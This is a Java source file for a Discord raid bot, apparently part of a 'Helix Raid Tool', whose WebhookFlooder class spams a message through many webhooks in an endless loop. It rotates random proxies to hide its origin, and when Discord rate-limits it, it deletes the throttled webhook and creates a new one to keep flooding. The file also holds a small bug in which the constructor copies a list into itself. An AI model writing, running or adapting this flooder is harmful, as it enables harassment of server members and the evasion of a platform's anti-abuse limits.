
package bot;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import http.HttpRequest;

public class WebhookFlooder implements Runnable {
	private int rateLimitCounter;
	private List<String> WHIDs;
	private List<String> WHTokens;
	private List<String> idArray;
	private String[] proxyList;
	private String msg;
	private String token;

	public WebhookFlooder(final List<String> WHIDs, final String[] proxyList, final String msg,
			final List<String> WHTokens, final String token, final List<String> idArray) {
		this.WHIDs = new ArrayList<String>();
		this.WHTokens = new ArrayList<String>();
		this.idArray = new ArrayList<String>();
		this.WHIDs.addAll(WHIDs);
		this.proxyList = proxyList;
		this.msg = msg;
		this.WHTokens.addAll(WHTokens);
		this.token = token;
		idArray.addAll(idArray);
	}

	// replace webhooks if they are being ratelimited
	public void WebhookReplacer(final String WHID) {
		String res = null;
		try {
			System.out.println("sending request to delete ratelimiting webhook");
			final HttpRequest rq = new HttpRequest("https://discord.com/api/v8/webhooks/" + WHID, "utf-8", "DELETE");
			rq.addHeader("Content-Type", "application/json");
			rq.addHeader("Authorization", "Bot " + this.token);
			rq.setPostData(null);
			res = rq.finish();
			System.out.println(res);
		} catch (Exception e) {
			e.printStackTrace();
		}
		final Random rand = new Random();
		final String randProxy = this.proxyList[rand.nextInt(this.proxyList.length)];
		final String[] proxySplit = randProxy.split(":");
		System.setProperty("http.proxyHost", proxySplit[0]);
		System.setProperty("http.proxyPort", proxySplit[1]);
		final String randID = this.idArray.get(rand.nextInt(this.idArray.size()));
		try {
			System.out.println("sending webhook creation");
			final HttpRequest rq = new HttpRequest("https://discord.com/api/v8/channels/" + randID + "/webhooks",
					"utf-8", "POST");
			rq.addHeader("Content-Type", "application/json");
			rq.addHeader("Authorization", "Bot " + this.token);
			final String json = "{\"name\":\"EZ Webhook'd by Helix Raid Tool\"}";
			rq.setPostData(json);
			res = rq.finish();
			System.out.println(res);
		} catch (Exception e) {
			e.printStackTrace();
		}
		int WHIDPos;
		int WHIDEndpoint;
		for (int i = 0; i < res.length()
				&& res.indexOf("\"type\": 1, \"id\"", i) != -1; i = WHIDPos + 7 + WHIDEndpoint) {
			WHIDPos = res.indexOf("\"type\": 1, \"id\"", i);
			String WHIDTemp = res.substring(WHIDPos + 18);
			WHIDEndpoint = WHIDTemp.indexOf("\"");
			WHIDTemp = WHIDTemp.substring(0, WHIDEndpoint);
			System.out.println(WHIDTemp);
			this.WHIDs.add(WHIDTemp);
		}
		int WHTokenPos;
		int WHTokenEndpoint;
		for (int i = 0; i < res.length() && res.indexOf("\"token\"", i) != -1; i = WHTokenPos + 7 + WHTokenEndpoint) {
			WHTokenPos = res.indexOf("\"token\"", i);
			String WHTokenTemp = res.substring(WHTokenPos + 10);
			WHTokenEndpoint = WHTokenTemp.indexOf("\"");
			WHTokenTemp = WHTokenTemp.substring(0, WHTokenEndpoint);
			System.out.println(WHTokenTemp);
			this.WHTokens.add(WHTokenTemp);
		}
	}

	@Override
	public void run() {
		boolean interrupted = false;
		while (true) {
			if (Thread.interrupted()) {
				interrupted = true;
			}
			if (interrupted) {
				break;
			}

			// loop to send msg's through webhook after connecting to proxy
			for (int i = 0; i < this.WHIDs.size() && !interrupted; i++) {
				if (!Thread.interrupted()) {
					final Random rand = new Random();
					final String randProxy = this.proxyList[rand.nextInt(this.proxyList.length)];
					final String[] proxySplit = randProxy.split(":");
					System.setProperty("http.proxyHost", proxySplit[0]);
					System.setProperty("http.proxyPort", proxySplit[1]);
					System.out.println("proxy property set");
					// the above code changes the proxy of the entire application because it doesn't
					// really matter as long as the proxies are getting chosen randomly
					try {
						System.out.println("sending webhook request");
						final HttpRequest rq = new HttpRequest(
								"https://discord.com/api/webhooks/" + this.WHIDs.get(i) + "/" + this.WHTokens.get(i),
								"utf-8", "POST");
						final String json = "{\"content\":\"" + this.msg + "\"}";
						rq.setPostData(json);
						rq.addHeader("Content-Type", "application/json");
						final String res = rq.finish();
						System.out.println(res);
						if (rq.statusCode() == 429) {
							System.out.println("initializing webhookreplacer");
							this.WebhookReplacer(this.WHIDs.get(i));
							break;
						}
						if (rq.statusCode() >= 300) {
							++this.rateLimitCounter;
						} else {
							this.rateLimitCounter = 0;
						}
						// if http response is bad 25 times in a row, stop thread
						if (this.rateLimitCounter == 25) {
							interrupted = true;
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				} else {
					interrupted = true;
				}
			}
		}
	}
}
